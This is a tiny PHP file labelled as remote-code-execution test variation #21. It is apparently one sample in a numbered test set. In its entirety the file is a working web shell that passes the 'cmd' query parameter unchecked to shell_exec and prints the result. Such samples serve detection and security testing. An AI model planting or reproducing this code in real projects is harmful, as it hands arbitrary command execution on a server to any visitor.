<?php
// RCE test variation #21
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>